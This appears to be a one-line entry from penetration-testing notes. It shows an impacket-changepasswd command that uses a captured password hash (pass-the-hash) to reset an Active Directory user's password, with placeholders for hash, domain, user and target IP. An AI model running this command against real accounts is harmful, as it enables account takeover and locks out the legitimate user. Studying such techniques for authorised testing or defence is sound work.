> If we have a users hash we could try and change their password:

```
impacket-changepasswd -hashes :<hash> <domain>/<user>@<ip> -newpass 'NewComplexPassword!'
```
